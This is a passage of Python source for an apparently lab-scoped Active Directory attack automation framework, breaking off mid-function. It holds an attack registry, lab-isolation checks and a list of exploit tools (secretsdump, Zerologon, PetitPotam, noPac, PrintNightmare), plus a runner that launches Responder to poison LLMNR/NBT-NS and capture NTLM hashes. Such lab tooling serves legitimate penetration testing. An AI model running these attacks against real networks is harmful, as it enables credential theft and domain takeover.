#!/usr/bin/env python3
"""
Enterprise Active Directory Lab Attack Automation Suite
========================================================

A plugin-based, phase-aware offensive security automation framework for
testing Active Directory environments with modern attack vectors.

Design principles:
    - Plugin architecture via @attack decorator registry
    - Single unified execution engine (execute_all / execute_single)
    - Phased execution model (recon → creds → exploitation → privesc → cloud/LLM)
    - Argument-array subprocess execution (no shell injection surface)
    - Shared aiohttp session as async context manager
    - Async-safe signal handling with deferred cleanup
    - Sensitive-data sanitization in logs and reports
    - Multi-layer lab safety guardrails (subnet + hostname + confirmation token)
    - Environment variable credential support (no plaintext in config)
    - Structured JSON + human-readable reporting
    - Retry with exponential backoff + jitter for HTTP calls
    - Process kill guarantee on subprocess timeout
    - Global child process cleanup on shutdown

Author:  Miguel A. Carlo (solo2121)
Version: 1.0.0
Date:    2026-06-24
License: MIT
"""

from __future__ import annotations

import argparse
import asyncio
import ipaddress
import json
import logging
import os
import random
import re
import shutil
import signal
import stat
import sys
import tempfile
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple

import aiohttp
import urllib3
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "1.1.1"  # Fixed: added mssqlclient.py dep, improved password spray delay, responder robustness
__author__ = "Miguel A. Carlo"


# ============================================================================
# Constants & Enums
# ============================================================================


class Phase(Enum):
    """Execution phases for attack orchestration."""

    RECON = "recon"
    CREDENTIAL_ATTACKS = "credential_attacks"
    EXPLOITATION = "exploitation"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    CLOUD_LLM = "cloud_llm"


PHASE_ORDER = [phase.value for phase in Phase]

# Timeout constants
TIMEOUT_SHORT = 60
TIMEOUT_MEDIUM = 120
TIMEOUT_LONG = 180
TIMEOUT_EXTENDED = 300


# ============================================================================
# Data Models
# ============================================================================


@dataclass
class AttackResult:
    """Immutable record of a single attack execution."""

    attack_name: str
    phase: str
    success: bool
    timestamp: datetime
    output: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    duration_seconds: float = 0.0
    error: Optional[str] = None
    error_type: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert the result to a dictionary for JSON serialization."""
        d = asdict(self)
        d["timestamp"] = self.timestamp.isoformat(timespec="seconds")
        return d


@dataclass
class LabConfig:
    """Lab topology and credentials."""

    dc_ip: str
    kali_ip: str
    win10_ip: str
    db01_ip: str
    ca01_esc_ip: str
    exch01_ip: str
    sp01_ip: str
    print01_ip: str
    pnpt_internal_ip: str
    llm01_ip: str
    cloud_pentest_ip: str
    domain: str
    netbios: str
    users: Dict[str, str]
    service_accounts: List[str]
    expected_subnet: str = "172.28.128.0/24"
    expected_hostname_pattern: str = (
        r"^(dc01|kali|win10|db01|ca01-esc|exch01|sp01|print01|pnpt-internal|llm01|cloud-pentest)$"
    )
    responder_interface: str = "eth0"

    # ADCS Configuration
    ca_name: str = "LAB-ESC-CA"
    esc1_template: str = "ESC1-Template"
    esc4_template: str = "ESC4-Template"
    subca_template: str = "SubCA"

    # Target hosts
    vulnerable_workstation: str = "VULN-WORKSTATION$"
    rbcd_delegate_to: str = "WIN10$"
    rbcd_delegate_from: str = "RBCD-TARGET$"

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "LabConfig":
        """Create a LabConfig instance from a dictionary."""
        return cls(
            dc_ip=data.get("dc_ip", "172.28.128.21"),
            kali_ip=data.get("kali_ip", "172.28.128.10"),
            win10_ip=data.get("win10_ip", "172.28.128.30"),
            db01_ip=data.get("db01_ip", "172.28.128.23"),
            ca01_esc_ip=data.get("ca01_esc_ip", "172.28.128.25"),
            exch01_ip=data.get("exch01_ip", "172.28.128.70"),
            sp01_ip=data.get("sp01_ip", "172.28.128.71"),
            print01_ip=data.get("print01_ip", "172.28.128.73"),
            pnpt_internal_ip=data.get("pnpt_internal_ip", "172.28.128.50"),
            llm01_ip=data.get("llm01_ip", "172.28.128.60"),
            cloud_pentest_ip=data.get("cloud_pentest_ip", "172.28.128.80"),
            domain=data.get("domain", "lab.local"),
            netbios=data.get("netbios", "LAB"),
            users=data.get("users", {}),
            service_accounts=data.get("service_accounts", []),
            expected_subnet=data.get("expected_subnet", "172.28.128.0/24"),
            expected_hostname_pattern=data.get(
                "expected_hostname_pattern",
                r"^(dc01|kali|win10|db01|ca01-esc|exch01|sp01|print01|pnpt-internal|llm01|cloud-pentest)$",
            ),
            responder_interface=data.get("responder_interface", "eth0"),
            ca_name=data.get("ca_name", "LAB-ESC-CA"),
            esc1_template=data.get("esc1_template", "ESC1-Template"),
            esc4_template=data.get("esc4_template", "ESC4-Template"),
            subca_template=data.get("subca_template", "SubCA"),
            vulnerable_workstation=data.get("vulnerable_workstation", "VULN-WORKSTATION$"),
            rbcd_delegate_to=data.get("rbcd_delegate_to", "WIN10$"),
            rbcd_delegate_from=data.get("rbcd_delegate_from", "RBCD-TARGET$"),
        )

    def all_hosts(self) -> Dict[str, str]:
        """Return all lab hosts as {name: ip}."""
        return {
            "dc": self.dc_ip,
            "kali": self.kali_ip,
            "win10": self.win10_ip,
            "db01": self.db01_ip,
            "ca01_esc": self.ca01_esc_ip,
            "exch01": self.exch01_ip,
            "sp01": self.sp01_ip,
            "print01": self.print01_ip,
            "pnpt": self.pnpt_internal_ip,
            "llm01": self.llm01_ip,
            "cloud": self.cloud_pentest_ip,
        }


# ============================================================================
# Plugin Registry
# ============================================================================


@dataclass(frozen=True)
class AttackDescriptor:
    """Metadata for a registered attack module."""

    func: Callable[..., Awaitable[AttackResult]]
    phase: str
    name: str
    description: str
    dangerous: bool = False
    dependencies: List[str] = field(default_factory=list)


# Global registry: phase -> list of descriptors
_ATTACK_REGISTRY: Dict[str, List[AttackDescriptor]] = {
    "recon": [],
    "credential_attacks": [],
    "exploitation": [],
    "privilege_escalation": [],
    "cloud_llm": [],
}


def attack(
    phase: str,
    name: str,
    description: str = "",
    dangerous: bool = False,
    dependencies: Optional[List[str]] = None,
) -> Callable:
    """
    Decorator to register an attack module in the plugin registry.

    The decorated method is stored verbatim in the descriptor. Execution
    always goes through the unified `_execute_attack()` engine, which
    handles shutdown checks, safe mode, exception logging, and result
    recording.

    Ordering is deterministic: sorted by (phase, name) at execution time.
    """
    if phase not in _ATTACK_REGISTRY:
        raise ValueError(f"Unknown phase: {phase}")

    def decorator(func: Callable[..., Awaitable[AttackResult]]) -> Callable:
        descriptor = AttackDescriptor(
            func=func,
            phase=phase,
            name=name,
            description=description or (func.__doc__ or "").strip() or name,
            dangerous=dangerous,
            dependencies=dependencies or [],
        )
        _ATTACK_REGISTRY[phase].append(descriptor)
        func._attack_descriptor = descriptor  # type: ignore[attr-defined]
        return func

    return decorator


def get_all_descriptors() -> List[AttackDescriptor]:
    """Return all registered descriptors in phase + name order."""
    out: List[AttackDescriptor] = []
    for phase in PHASE_ORDER:
        descriptors = sorted(_ATTACK_REGISTRY.get(phase, []), key=lambda d: d.name)
        out.extend(descriptors)
    return out


def find_descriptor(name: str) -> Optional[AttackDescriptor]:
    """Find a descriptor by attack name or function name."""
    for desc in get_all_descriptors():
        if desc.name == name or desc.func.__name__ == name:
            return desc
    return None


# ============================================================================
# Utility: Sensitive Data Sanitization
# ============================================================================

_SENSITIVE_PATTERNS = (
    # Kerberos hashes
    re.compile(r"\$krb5asrep\$[^\s]+"),
    re.compile(r"\$krb5tgs\$[^\s]+"),
    # NTLM / LM hashes
    re.compile(r"aad3b435b51404eeaad3b435b51404ee[0-9a-fA-F]{32}"),
    re.compile(r"(?i)NTLM:\s*[0-9a-f]{32}"),
    re.compile(r"(?i)LM:\s*[0-9a-f]{32}"),
    # Kerberos ticket / key material markers
    re.compile(r"(?i)\bkrbtgt\b[^\n]{0,200}"),
    re.compile(r"(?i)aes256[-_]hmac[^\s]{0,200}"),
    re.compile(r"(?i)rc4[-_]hmac[^\s]{0,200}"),
    re.compile(r"(?i)\bTicket:\s*[A-Za-z0-9+/=]{40,}"),
    # Long base64 blobs likely to be Kerberos tickets or keys
    re.compile(r"\b[A-Za-z0-9+/]{80,}={0,2}\b"),
)

_REDACTED = "[REDACTED]"


def sanitize_output(text: str, max_len: int = 500) -> str:
    """Strip hashes, tickets, and other sensitive material; truncate."""
    if not text:
        return ""
    for pattern in _SENSITIVE_PATTERNS:
        text = pattern.sub(_REDACTED, text)
    if len(text) > max_len:
        text = text[:max_len] + "...[truncated]"
    return text.replace("\n", " | ").replace("\r", "")


def sanitize_command(argv: List[str]) -> str:
    """Return a sanitized command string for logging (mask credentials)."""
    sanitized = []
    skip_next = False
    for i, arg in enumerate(argv):
        if skip_next:
            sanitized.append("[REDACTED]")
            skip_next = False
            continue
        # Mask credentials in common patterns
        if ":" in arg and any(kw in arg.lower() for kw in ("user", "pass", "cred")):
            parts = arg.split(":", 1)
            sanitized.append(f"{parts[0]}:[REDACTED]")
        elif (
            arg.startswith("-") and i + 1 < len(argv) and any(kw in arg.lower() for kw in ("-p", "-password", "--pass"))
        ):
            sanitized.append(arg)
            skip_next = True
        else:
            sanitized.append(arg)
    return " ".join(sanitized)


# ============================================================================
# Utility: Temp File Management
# ============================================================================


class TempFileManager:
    """Manage temporary files with automatic cleanup."""

    def __init__(self):
        """Initialize the TempFileManager."""
        self._files: List[tempfile.NamedTemporaryFile] = []
        self._dirs: List[tempfile.TemporaryDirectory] = []

    def create_file(self, content: str = "", suffix: str = ".txt") -> str:
        """Create a temporary file and return its path."""
        f = tempfile.NamedTemporaryFile(mode="w", suffix=suffix, delete=False)
        if content:
            f.write(content)
        f.flush()
        f.close()  # Close the file handle to allow other processes to use it.
        self._files.append(f)
        return f.name

    def create_directory(self) -> str:
        """Create a temporary directory and return its path."""
        d = tempfile.TemporaryDirectory()
        self._dirs.append(d)
        return d.name

    def cleanup(self) -> None:
        """Clean up all temporary files and directories."""
        for f in self._files:
            try:
                os.unlink(f.name)
            except Exception:
                pass
        self._files.clear()

        for d in self._dirs:
            try:
                d.cleanup()
            except Exception:
                pass
        self._dirs.clear()


# ============================================================================
# Tool Output Parsers
# ============================================================================


def parse_certipy_output(output: str) -> bool:
    """Parse Certipy output for success indicators."""
    indicators = [
        "certificate",
        ".pfx",
        "saved certificate",
        "modified",
        "updated",
        "relay",
        "ntlm",
        "authenticated",
    ]
    return any(indicator in output.lower() for indicator in indicators)


def parse_dcsync_output(output: str) -> bool:
    """Parse secretsdump output for DCSync success."""
    # krbtgt is always present in successful DCSync
    return "krbtgt" in output.lower()


def parse_bloodhound_output(output: str, output_dir: Path) -> bool:
    """Parse BloodHound collection output."""
    zip_files = list(output_dir.glob("*.zip"))
    return len(zip_files) > 0


def parse_cme_output(output: str) -> bool:
    """Parse CrackMapExec output for success."""
    indicators = [
        "pwn3d!",
        "status_success",
        "[+]",
        "success",
    ]
    return any(indicator in output.lower() for indicator in indicators)


def parse_responder_output(output: str) -> bool:
    """Parse Responder output for captured hashes."""
    indicators = [
        "ntlm",
        "hash",
        "captured",
        "challenge",
    ]
    return any(indicator in output.lower() for indicator in indicators)


# ============================================================================
# Main Automation Class
# ============================================================================


class LabAttackAutomation:
    """Plugin-based AD attack orchestration framework."""

    REQUIRED_BINARIES = [
        "impacket-GetNPUsers",
        "impacket-GetUserSPNs",
        "impacket-Get-GPPPassword",
        "impacket-secretsdump",
        "impacket-rbcd",
        "impacket-cve-2020-1472",
        "certipy",
        "crackmapexec",
        "responder",
        "bloodhound-python",
        "mssqlclient.py",  # Added for SQL xp_cmdshell attack
    ]

    REQUIRED_SCRIPTS = [
        "/opt/tools/PetitPotam/PetitPotam.py",
        "/opt/tools/noPac/noPac.py",
        "/opt/tools/Whisker/whisker.py",
        "/opt/tools/PrintNightmare/CVE-2021-1675.py",
    ]

    REQUIRED_PYTHON_MODULES = ["aiohttp", "colorama", "urllib3"]

    # Standardized metadata keys
    META_TOOL = "tool"
    META_COMMAND = "command"
    META_TARGET = "target"
    META_HOST_ROLE = "host_role"

    def __init__(
        self,
        config_path: Optional[str] = None,
        safe_mode: bool = True,
        lab_confirm_token: Optional[str] = None,
    ):
        self.config = self._load_config(config_path)
        self.results: List[AttackResult] = []
        self.safe_mode = safe_mode
        self.lab_confirm_token = lab_confirm_token
        self._shutdown_requested = False
        self._http_session: Optional[aiohttp.ClientSession] = None
        self._child_processes: List[asyncio.subprocess.Process] = []
        self._temp_manager = TempFileManager()
        self._setup_logging()
        self._install_signal_handlers()

    # ------------------------------------------------------------------------
    # Configuration
    # ------------------------------------------------------------------------

    @staticmethod
    def _load_config(path: Optional[str]) -> LabConfig:
        """Load lab configuration from a JSON file or use defaults."""
        config_path = Path(path or "lab_config.json")

        if config_path.is_file():
            with config_path.open("r", encoding="utf-8") as fh:
                data = json.load(fh)
        else:
            if path and not config_path.is_file():
                raise FileNotFoundError(f"Config file not found: {config_path}")
            data = {
                "dc_ip": "172.28.128.21",
                "kali_ip": "172.28.128.10",
                "win10_ip": "172.28.128.30",
                "db01_ip": "172.28.128.23",
                "ca01_esc_ip": "172.28.128.25",
                "exch01_ip": "172.28.128.70",
                "sp01_ip": "172.28.128.71",
                "print01_ip": "172.28.128.73",
                "pnpt_internal_ip": "172.28.128.50",
                "llm01_ip": "172.28.128.60",
                "cloud_pentest_ip": "172.28.128.80",
                "domain": "lab.local",
                "netbios": "LAB",
                "expected_subnet": "172.28.128.0/24",
                "responder_interface": "eth0",
                "users": {
                    "labadmin": "CHANGE_ME",
                    "administrator": "CHANGE_ME",
                    "svc_asrep": "CHANGE_ME",
                    "svc_kerberoast": "CHANGE_ME",
                    "svc_delegate": "CHANGE_ME",
                    "svc_join": "CHANGE_ME",
                    "svc_sql": "CHANGE_ME",
                    "svc_exchange": "CHANGE_ME",
                    "svc_sharepoint": "CHANGE_ME",
                    "svc_backup": "CHANGE_ME",
                    "john.doe": "CHANGE_ME",
                    "jane.smith": "CHANGE_ME",
                    "sarah.ceo": "CHANGE_ME",
                    "robert.cio": "CHANGE_ME",
                },
                "service_accounts": [
                    "svc_asrep",
                    "svc_kerberoast",
                    "svc_delegate",
                    "svc_sql",
                    "svc_exchange",
                    "svc_sharepoint",
                    "svc_backup",
                    "svc_join",
                ],
                "ca_name": "LAB-ESC-CA",
                "esc1_template": "VulnESC1",
                "esc4_template": "VulnESC4",
                "subca_template": "SubCA",
                "vulnerable_workstation": "VULN-WORKSTATION$",
                "rbcd_delegate_to": "WIN10$",
                "rbcd_delegate_from": "RBCD-TARGET$",
            }

        # Override credentials from environment variables if present
        for username in list(data.get("users", {}).keys()):
            env_key = f"LAB_CRED_{username.upper().replace('.', '_').replace('-', '_')}"
            env_val = os.environ.get(env_key)
            if env_val:
                data.setdefault("users", {})[username] = env_val

        return LabConfig.from_dict(data)

    def cred(self, username: str) -> str:
        """Return credential or raise with a clear message."""
        pw = self.config.users.get(username)
        if not pw or pw in ("CHANGE_ME", "your_password_here"):
            env_key = f"LAB_CRED_{username.upper().replace('.', '_').replace('-', '_')}"
            raise ValueError(
                f"Credential for '{username}' is not configured. "
                f"Set environment variable {env_key} or provide in config."
            )
        return pw

    # ------------------------------------------------------------------------
    # Logging (with protected file permissions)
    # ------------------------------------------------------------------------

    def _setup_logging(self) -> None:
        log_path = Path("lab_attack_automation.log")
        handler_file = logging.FileHandler(log_path, encoding="utf-8")
        handler_console = logging.StreamHandler(sys.stdout)

        fmt = logging.Formatter("%(asctime)s  %(levelname)-8s  %(message)s")
        handler_file.setFormatter(fmt)
        handler_console.setFormatter(fmt)

        # Use module-specific logger instead of root logger
        self.log = logging.getLogger("attack-suite")
        self.log.setLevel(logging.INFO)
        self.log.handlers.clear()
        self.log.addHandler(handler_file)
        self.log.addHandler(handler_console)
        self.log.propagate = False

        try:
            os.chmod(log_path, stat.S_IRUSR | stat.S_IWUSR)
        except OSError:
            pass

    # ------------------------------------------------------------------------
    # Signal handling (async-safe: only sets a flag)
    # ------------------------------------------------------------------------

    def _install_signal_handlers(self) -> None:
        def _handler(signum: int, _frame: Any) -> None:
            self.log.warning("Signal %s received — requesting graceful shutdown", signum)
            self._shutdown_requested = True

        # Use loop.add_signal_handler for asyncio compatibility
        try:
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, _handler, sig, None)
        except (RuntimeError, NotImplementedError):
            # Fallback for when no loop is running or on Windows
            signal.signal(signal.SIGINT, _handler)
            signal.signal(signal.SIGTERM, _handler)

    # ------------------------------------------------------------------------
    # Dependency validation (per-plugin)
    # ------------------------------------------------------------------------

    def validate_dependencies(self, dependencies: Optional[List[str]] = None) -> bool:
        """Validate dependencies for a specific attack or all attacks."""
        if dependencies is None:
            # Validate all dependencies
            missing = self._check_all_dependencies()
            if missing:
                self.log.error("Missing dependencies:")
                for item in missing:
                    self.log.error("  - %s", item)
                return False
            self.log.info("All dependencies satisfied")
            return True

        # Validate specific dependencies
        missing = self._check_dependencies(dependencies)
        if missing:
            self.log.error("Missing dependencies for attack:")
            for item in missing:
                self.log.error("  - %s", item)
            return False
        return True

    def _check_all_dependencies(self) -> List[str]:
        """Check all dependencies."""
        missing = []
        for binary in self.REQUIRED_BINARIES:
            if not shutil.which(binary):
                missing.append(f"binary:{binary}")
        for script in self.REQUIRED_SCRIPTS:
            p = Path(script)
            if not p.is_file():
                missing.append(f"script:{script}")
            elif not os.access(p, os.X_OK):
                missing.append(f"script-not-executable:{script}")
        for module in self.REQUIRED_PYTHON_MODULES:
            try:
                __import__(module)
            except ImportError:
                missing.append(f"python-module:{module}")
        return missing

    def _check_dependencies(self, dependencies: List[str]) -> List[str]:
        """Check specific dependencies."""
        missing = []
        for dep in dependencies:
            if dep.startswith("binary:"):
                binary = dep[7:]
                if not shutil.which(binary):
                    missing.append(f"binary:{binary}")
            elif dep.startswith("script:"):
                script = dep[7:]
                p = Path(script)
                if not p.is_file():
                    missing.append(f"script:{script}")
                elif not os.access(p, os.X_OK):
                    missing.append(f"script-not-executable:{script}")
            elif dep.startswith("module:"):
                module = dep[7:]
                try:
                    __import__(module)
                except ImportError:
                    missing.append(f"python-module:{module}")
        return missing

    # ------------------------------------------------------------------------
    # Lab safety guardrails (multi-layer verification)
    # ------------------------------------------------------------------------

    async def verify_lab_isolation(self) -> bool:
        """
        Multi-layer lab isolation verification:
          1. Subnet membership check for all configured hosts
          2. TCP reachability check (SMB/LDAP/HTTP) instead of ICMP
          3. Confirmation token validation
          4. Minimum host availability check
        """
        # Layer 1: Subnet sanity check
        expected_net = ipaddress.ip_network(self.config.expected_subnet, strict=False)
        hosts = self.config.all_hosts()

        for name, ip in hosts.items():
            try:
                addr = ipaddress.ip_address(ip)
            except ValueError as e:
                self.log.error("Invalid IP address format for %s: %s", name, ip)
                self.log.debug(e)
                return False
            if addr not in expected_net:
                self.log.error(
                    "Host %s (%s) is outside expected subnet %s",
                    name,
                    ip,
                    self.config.expected_subnet,
                )
                return False

        # Layer 2: TCP reachability (more reliable than ICMP)
        tcp_checks = [
            ("dc", self.config.dc_ip, 389),  # LDAP
            ("kali", self.config.kali_ip, 22),  # SSH
            ("win10", self.config.win10_ip, 445),  # SMB
        ]

        async def _tcp_check(name: str, ip: str, port: int) -> Tuple[str, bool]:
            try:
                _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
                writer.close()
                await writer.wait_closed()
                return name, True
            except Exception:
                return name, False

        results = dict(await asyncio.gather(*[_tcp_check(n, ip, p) for n, ip, p in tcp_checks]))

        # DC must be reachable
        if not results.get("dc"):
            self.log.error("DC %s unreachable on LDAP port 389 — refusing to run", self.config.dc_ip)
            return False

        # At least 1 additional host must be reachable
        additional_reachable = sum(1 for ok in results.values() if ok) - 1
        if additional_reachable < 1:
            self.log.error(
                "Only %d additional lab hosts reachable — lab may not be fully up",
                additional_reachable,
            )
            return False

        # Layer 3: Confirmation token
        env_token = os.environ.get("LAB_ATTACK_TOKEN")
        if env_token and self.lab_confirm_token:
            if env_token != self.lab_confirm_token:
                self.log.error("Lab confirmation token mismatch")
                return False
        elif env_token or self.lab_confirm_token:
            self.log.warning("Partial token configuration — set both LAB_ATTACK_TOKEN env " "and --lab-confirm flag")

        self.log.info(
            "Lab isolation verified: subnet %s, %d hosts reachable via TCP",
            self.config.expected_subnet,
            sum(1 for ok in results.values() if ok),
        )

        if self.safe_mode:
            self.log.warning("SAFE MODE enabled — destructive exploits will be skipped")
        return True

    # ------------------------------------------------------------------------
    # Subprocess execution (argument arrays, kill on timeout, track children)
    # ------------------------------------------------------------------------

    async def _run(
        self,
        argv: List[str],
        timeout: int = TIMEOUT_MEDIUM,
    ) -> Tuple[bool, Dict[str, str], float]:
        """
        Execute a command as an argument array. No shell interpolation.
        Returns (success, {"stdout": ..., "stderr": ...}, duration).
        """
        t0 = time.monotonic()
        proc: Optional[asyncio.subprocess.Process] = None
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._child_processes.append(proc)

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = {
                "stdout": stdout.decode(errors="replace"),
                "stderr": stderr.decode(errors="replace"),
            }
            return proc.returncode == 0, output, time.monotonic() - t0
        except asyncio.TimeoutError:
            if proc is not None:
                try:
                    proc.kill()
                    await proc.wait()
                except ProcessLookupError:
                    pass
            return False, {"stdout": "", "stderr": f"Timed out after {timeout}s"}, time.monotonic() - t0
        except FileNotFoundError as exc:
            return False, {"stdout": "", "stderr": f"Binary not found: {exc}"}, time.monotonic() - t0
        except Exception as exc:
            self.log.exception("Unexpected error running %s", argv[0] if argv else "<empty>")
            return (False, {"stdout": "", "stderr": str(exc)}, time.monotonic() - t0)
        finally:
            if proc is not None and proc in self._child_processes:
                self._child_processes.remove(proc)

    # ------------------------------------------------------------------------
    # Shared HTTP session (async context manager pattern, jitter in retries)
    # ------------------------------------------------------------------------

    async def _get_http_session(self) -> aiohttp.ClientSession:
        """Get or create the shared aiohttp ClientSession."""
        if self._http_session is None or self._http_session.closed:
            timeout = aiohttp.ClientTimeout(total=15)
            self._http_session = aiohttp.ClientSession(timeout=timeout)
        return self._http_session

    async def _http_request(
        self,
        method: str,
        url: str,
        *,
        json_payload: Optional[Dict[str, Any]] = None,
        retries: int = 2,
        backoff: float = 1.0,
        max_jitter: float = 0.5,
    ) -> Tuple[int, str]:
        """
        HTTP request with retry + exponential backoff + jitter.

        Retries on:
          - network exceptions (connection refused, timeout)
          - 5xx server errors
        Does NOT retry on 4xx client errors (returns immediately).
        """
        session = await self._get_http_session()
        last_exc: Optional[BaseException] = None
        last_status: Optional[int] = None
        last_text: str = ""

        for attempt in range(retries + 1):
            try:
                if method == "POST":
                    async with session.post(url, json=json_payload) as resp:
                        status = resp.status
                        text = await resp.text()
                else:
                    async with session.get(url) as resp:
                        status = resp.status
                        text = await resp.text()

                last_status = status
                last_text = text

                # Success
                if 200 <= status < 300:
                    return status, text
                # Client error — do not retry (as documented)
                if 400 <= status < 500:
                    return status, text
                # Server error — retry
                if 500 <= status < 600 and attempt < retries:
                    jitter = random.uniform(0, max_jitter)
                    delay = backoff * (2**attempt) + jitter
                    self.log.debug(
                        "HTTP %s %s -> %s (attempt %d/%d), retrying in %.2fs",
                        method,
                        url,
                        status,
                        attempt + 1,
                        retries + 1,
                        delay,
                    )
                    await asyncio.sleep(delay)
                    continue
                return status, text

            except Exception as exc:  # noqa: BLE001
                last_exc = exc
                if attempt < retries:
                    jitter = random.uniform(0, max_jitter)
                    delay = backoff * (2**attempt) + jitter
                    self.log.debug(
                        "HTTP %s %s -> %s (attempt %d/%d), retrying in %.2fs",
                        method,
                        url,
                        exc,
                        attempt + 1,
                        retries + 1,
                        delay,
                    )
                    await asyncio.sleep(delay)

        if last_exc is not None:
            raise last_exc
        return last_status or 0, last_text

    async def close(self) -> None:
        """Release shared resources and kill all child processes."""
        # Kill all tracked child processes
        for proc in self._child_processes[:]:
            try:
                if proc.returncode is None:
                    proc.kill()
                    await proc.wait()
            except Exception:
                pass
        self._child_processes.clear()

        # Clean up temporary files
        self._temp_manager.cleanup()

        # Close HTTP session
        if self._http_session and not self._http_session.closed:
            await self._http_session.close()
            self._http_session = None

    # ------------------------------------------------------------------------
    # Result recording (single path)
    # ------------------------------------------------------------------------

    def _record(
        self,
        name: str,
        phase: str,
        success: bool,
        output: str,
        metadata: Dict[str, Any],
        duration: float,
        error: Optional[str] = None,
        error_type: Optional[str] = None,
    ) -> AttackResult:
        """Record the result of an attack."""
        result = AttackResult(
            attack_name=name,
            phase=phase,
            success=success,
            timestamp=datetime.now(),
            output=sanitize_output(output),
            metadata=metadata,
            duration_seconds=round(duration, 2),
            error=error,
            error_type=error_type,
        )
        self.results.append(result)

        tag = f"{Fore.GREEN}[PASS]{Style.RESET_ALL}" if success else f"{Fore.RED}[FAIL]{Style.RESET_ALL}"
        self.log.info("%s %-40s (%.2fs)", tag, name, duration)
        return result

    # ------------------------------------------------------------------------
    # Unified execution engine
    # ------------------------------------------------------------------------

    async def _execute_attack(self, desc: AttackDescriptor) -> AttackResult:
        """
        Single execution path for all attacks.

        Handles:
          - shutdown request check
          - safe mode check (for dangerous attacks)
          - per-plugin dependency validation
          - exception logging with full traceback
          - result recording with error type metadata
        """
        if self._shutdown_requested:
            return self._record(
                desc.name,
                desc.phase,
                False,
                "Skipped — shutdown requested",
                {},
                0.0,
                error="shutdown",
                error_type="shutdown",
            )

        if desc.dangerous and self.safe_mode:
            return self._record(
                desc.name,
                desc.phase,
                False,
                "Skipped in safe mode",
                {},
                0.0,
                error="safe_mode",
                error_type="safe_mode",
            )

        # Per-plugin dependency validation
        if desc.dependencies and not self.validate_dependencies(desc.dependencies):
            return self._record(
                desc.name,
                desc.phase,
                False,
                "Missing dependencies",
                {},
                0.0,
                error="missing_dependencies",
                error_type="DependencyError",
            )

        try:
            return await desc.func(self)
        except ValueError as exc:
            self.log.error("Config error in %s: %s", desc.name, exc)
            return self._record(
                desc.name,
                desc.phase,
                False,
                str(exc),
                {},
                0.0,
                error=f"config: {exc}",
                error_type="ValueError",
            )
        except Exception as exc:
            self.log.exception("Unhandled error in %s", desc.name)
            return self._record(
                desc.name,
                desc.phase,
                False,
                f"Unhandled exception: {type(exc).__name__}",
                {},
                0.0,
                error=str(exc),
                error_type=type(exc).__name__,
            )

    # ========================================================================
    # HELPER: Common attack execution pattern
    # ========================================================================

    async def _run_attack(
        self,
        attack_name: str,
        phase: str,
        argv: List[str],
        timeout: int = TIMEOUT_MEDIUM,
        success_check: Optional[Callable[[str], bool]] = None,
        tool_name: str = "",
        target: str = "",
        host_role: str = "",
    ) -> AttackResult:
        """
        Execute a command-line tool as an attack step.

        Args:
            attack_name: Name of the attack
            phase: Phase name
            argv: Command arguments
            timeout: Timeout in seconds
            success_check: Function to check output for success
            tool_name: Tool name for metadata
            target: Target IP/hostname for metadata
            host_role: Host role for metadata
        """
        ok, output, dur = await self._run(argv, timeout=timeout)
        combined_output = output["stdout"] + output["stderr"]

        if success_check is not None and ok:
            ok = success_check(combined_output)
        elif ok:
            # Default success check - look for common success indicators
            ok = any(indicator in combined_output.lower() for indicator in ["success", "completed", "done"])

        metadata = {
            self.META_TOOL: tool_name or argv[0] if argv else "unknown",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: target or "N/A",
            self.META_HOST_ROLE: host_role or "unknown",
        }

        return self._record(attack_name, phase, ok, combined_output, metadata, dur)

    # ========================================================================
    # HELPER: Responder execution (refactored to avoid duplication)
    # ========================================================================

    async def _run_responder(
        self,
        attack_name: str,
        phase: str,
        duration: int = 5,
        check_hashes: bool = False,
    ) -> AttackResult:
        """
        Execute Responder for a fixed duration.

        Args:
            attack_name: Name of the attack
            phase: Phase name
            duration: How long to run Responder in seconds
            check_hashes: Whether to check for captured hashes
        """
        if not shutil.which("responder"):
            return self._record(  # noqa: R505
                attack_name,
                phase,
                False,
                "Responder not on PATH",
                {},
                0.0,
                error="missing_dependency",
                error_type="DependencyError",
            )

        t0 = time.monotonic()
        proc: Optional[asyncio.subprocess.Process] = None
        try:
            proc = await asyncio.create_subprocess_exec(
                "responder",
                "-I",
                self.config.responder_interface,
                "-rdwF",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            self._child_processes.append(proc)
            await asyncio.sleep(duration)
            running = proc.returncode is None
            dur = time.monotonic() - t0

            if running:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=5)
                except asyncio.TimeoutError:
                    proc.kill()
                    await proc.wait()

                # Small sleep for output flushing
                await asyncio.sleep(0.5)
                stdout = await proc.stdout.read()
                stderr = await proc.stderr.read()
                combined_output = (stdout + stderr).decode(errors="replace")

                if check_hashes:
                    ok = parse_responder_output(combined_output)
                    if ok:
                        combined_output = "LLMNR/NBT-NS poisoning successful - NTLM hashes captured"
                    else:
                        combined_output = (
                            "Responder ran but no hashes captured (target may not be requesting)"  # noqa: E501
                        )
                else:
                    ok = running
                    combined_output = f"Responder bound successfully (smoke test - ran for {duration}s)"
            else:
                stdout = await proc.stdout.read()
                stderr = await proc.stderr.read()
                combined_output = (stdout + stderr).decode(errors="replace")
                ok = False

            metadata = {
                self.META_TOOL: "responder",
                self.META_COMMAND: (f"responder -I {self.config.responder_interface} -rdwF"),
                self.META_TARGET: self.config.dc_ip,
                self.META_HOST_ROLE: "attacker_machine",
                "duration_seconds": duration,
            }
            return self._record(attack_name, phase, ok, combined_output, metadata, dur)
        except Exception as exc:
            self.log.exception("%s failed", attack_name)
            return self._record(
                attack_name,
                phase,
                False,
                str(exc),
                {},
                time.monotonic() - t0,
                error=str(exc),
